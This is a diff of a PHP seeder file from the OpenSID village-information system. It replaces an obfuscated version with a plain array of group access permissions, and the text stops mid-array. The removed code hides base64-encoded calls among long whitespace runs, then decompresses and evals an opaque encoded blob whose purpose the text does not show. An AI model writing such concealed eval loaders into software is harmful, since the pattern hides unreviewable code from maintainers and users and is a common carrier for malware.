@@ -1,585 +1,947 @@
-<?php 
-        $__='printf';$_='Loading donjo-app/models/seeders/dataAwal/GrupAkses.php';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='X19sYW1iZGE=';
-
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+/*
+ *
+ * File ini bagian dari:
+ *
+ * OpenSID
+ *
+ * Sistem informasi desa sumber terbuka untuk memajukan desa
+ *
+ * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
+ *
+ * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
+ * Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
+ *
+ * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
+ * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
+ * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
+ * asal tunduk pada syarat berikut:
+ *
+ * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
+ * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
+ * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
+ *
+ * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
+ * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
+ * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
+ *
+ * @package   OpenSID
+ * @author    Tim Pengembang OpenDesa
+ * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
+ * @copyright Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
+ * @license   http://www.gnu.org/licenses/gpl.html GPL V3
+ * @link      https://github.com/OpenSID/OpenSID
+ *
+ */
+
+defined('BASEPATH') || exit('No direct script access allowed');
+
+class GrupAkses extends CI_Model
+{
+    public function getData()
+    {
+        return [
+            [
+                'grup'  => 'Satgas Covid-19',
+                'slug'  => 'statistik',
+                'akses' => 0,
+            ],
+            [
+                'grup'  => 'Satgas Covid-19',
+                'slug'  => 'statistik-kependudukan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Satgas Covid-19',
+                'slug'  => 'kesehatan',
+                'akses' => 0,
+            ],
+            [
+                'grup'  => 'Satgas Covid-19',
+                'slug'  => 'pendataan',
+                'akses' => 7,
+            ],
+            [
+                'grup'  => 'Satgas Covid-19',
+                'slug'  => 'pemantauan',
+                'akses' => 7,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'home',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'kependudukan',
+                'akses' => 0,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'statistik',
+                'akses' => 0,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'layanan-surat',
+                'akses' => 0,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'analisis',
+                'akses' => 0,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'bantuan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'pertanahan',
+                'akses' => 0,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'pengaturan-peta',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'pemetaan',
+                'akses' => 0,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'hubung-warga',
+                'akses' => 0,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'pengaturan',
+                'akses' => 0,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'admin-web',
+                'akses' => 0,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'layanan-mandiri',
+                'akses' => 0,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'sekretariat',
+                'akses' => 0,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'identitas-desa',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'pemerintah-desa',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'wilayah-administratif',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'penduduk',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'keluarga',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'rumah-tangga',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'kelompok',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'data-suplemen',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'calon-pemilih',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'statistik-kependudukan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'laporan-bulanan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'laporan-kelompok-rentan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'pengaturan-surat',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'cetak-surat',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'arsip-layanan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'kirim-pesan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'daftar-kontak',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'modul',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'artikel',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'widget',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'menu',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'komentar',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'galeri',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'informasi-publik',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'media-sosial',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'slider',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'kotak-pesan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'pendaftar-layanan-mandiri',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'surat-masuk',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'surat-keluar',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'inventaris',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'peta',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'klasifikasi-surat',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'teks-berjalan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'kategori',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'log-penduduk',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'analisis-kategori',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'analisis-indikator',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'analisis-klasifikasi',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'analisis-periode',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'analisis-respon',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'analisis-laporan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'analisis-statistik-jawaban',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'api-inventaris-asset',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'api-inventaris-gedung',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'api-inventaris-gedung-1',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'api-inventaris-jalan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'api-inventaris-kontruksi',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'api-inventaris-peralatan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'api-inventaris-tanah',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'inventaris-asset',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'inventaris-gedung',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'inventaris-jalan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'inventaris-kontruksi',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'inventaris-peralatan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'laporan-inventaris',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'plan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'point',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'garis',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'line',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'area',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'polygon',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'kategori-kelompok',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'produk-hukum',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'informasi-publik-1',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'daftar-persyaratan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'permohonan-surat',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'status-desa',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'info-desa',
+                'akses' => 0,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'keuangan',
+                'akses' => 0,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'impor-data',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'laporan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'pengunjung',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'kesehatan',
+                'akses' => 0,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'pendataan',
+                'akses' => 7,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'pemantauan',
+                'akses' => 7,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'input-data',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'laporan-manual',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'pengaturan-web',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'qr-code',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'daftar-persil',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'buku-administrasi-desa',
+                'akses' => 0,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'administrasi-umum',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'administrasi-penduduk',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'administrasi-pembangunan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'buku-eskpedisi',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'buku-lembaran-dan-berita-desa',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'anjungan',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'pengaturan-layanan-mandiri',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'buku-mutasi-penduduk',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'buku-rekapitulasi-jumlah-penduduk',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'buku-penduduk-sementara',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'buku-ktp-dan-kk',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Redaksi',
+                'slug'  => 'admin-web',
+                'akses' => 0,
+            ],
+            [
+                'grup'  => 'Redaksi',
+                'slug'  => 'artikel',
+                'akses' => 7,
+            ],
+            [
+                'grup'  => 'Redaksi',
+                'slug'  => 'widget',
+                'akses' => 7,
+            ],
+            [
+                'grup'  => 'Redaksi',
+                'slug'  => 'menu',
+                'akses' => 7,
+            ],
+            [
+                'grup'  => 'Redaksi',
+                'slug'  => 'komentar',
+                'akses' => 7,
+            ],
+            [
+                'grup'  => 'Redaksi',
+                'slug'  => 'galeri',
+                'akses' => 7,
+            ],
+            [
+                'grup'  => 'Redaksi',
+                'slug'  => 'media-sosial',
+                'akses' => 7,
+            ],
+            [
+                'grup'  => 'Redaksi',
+                'slug'  => 'slider',
+                'akses' => 7,
+            ],
+            [
+                'grup'  => 'Redaksi',
+                'slug'  => 'teks-berjalan',
+                'akses' => 7,
+            ],
+            [
+                'grup'  => 'Redaksi',
+                'slug'  => 'pengunjung',
+                'akses' => 7,
+            ],
+            [
+                'grup'  => 'Redaksi',
+                'slug'  => 'pengaturan-web',
+                'akses' => 7,
+            ],
+            [
+                'grup'  => 'Kontributor',
+                'slug'  => 'admin-web',
+                'akses' => 0,
+            ],
+            [
+                'grup'  => 'Kontributor',
+                'slug'  => 'artikel',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Kontributor',
+                'slug'  => 'komentar',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Kontributor',
+                'slug'  => 'galeri',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Kontributor',
+                'slug'  => 'slider',
+                'akses' => 3,
+            ],
+            [
+                'grup'  => 'Operator',
+                'slug'  => 'buku-tanah-kas-desa',
+                'akses' => 3,
+            ],
+            [
